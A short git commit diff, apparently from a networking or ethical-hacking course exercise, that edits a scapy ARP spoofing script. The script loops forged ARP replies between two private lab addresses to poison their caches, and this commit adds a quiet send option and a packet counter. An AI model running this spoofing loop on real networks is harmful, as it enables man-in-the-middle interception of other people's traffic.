fc60e16bb373846fa87f3998cd4f3ad61ace8b1c
root <root@kali.kali>
2026-08-10 17:57:30 -0400

    making custom statement for scapy

--- pythonProject/arp_spoof/arp_spoof.py
+++ pythonProject/arp_spoof/arp_spoof.py
@@ -13,9 +13,12 @@ def get_mac(ip):
 
 def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
-    scapy.send(packet)
+    scapy.send(packet, verbose=False)
 
+sent_packet_count = 0
 while True:
     spoof("192.168.12.135", "192.168.12.2")
     spoof("192.168.12.2", "192.168.12.135")
+    sent_packet_count = sent_packet_count + 2
+    print("[+] packets sent: " + str(sent_packet_count))
     time.sleep(2)
